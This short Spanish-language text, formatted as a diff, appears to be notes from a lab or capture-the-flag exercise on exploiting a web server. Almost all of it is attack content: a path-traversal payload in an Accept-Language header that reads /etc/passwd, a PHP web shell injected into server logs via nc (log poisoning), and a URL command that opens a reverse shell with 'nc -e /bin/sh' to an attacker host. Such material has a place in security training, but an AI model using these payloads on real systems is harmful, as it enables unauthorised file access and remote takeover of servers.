@@ -1,0 +1,9 @@
+Accept-Language: ../../../../../etc/passwd,en;q=0.5'
+
+Podemos hacer log poisoning después del LFI, en la máquina de ataque nos conectamos al servidor web con nc y le enviamos la mini shell
+
+nc -n 172.17.0.4 80
+
+<?php echo shell_exec($_GET['cmd']);?>
+
+Y después en la url: ?cmd=nc%20-e%20/bin/sh%20172.17.0.3%20888
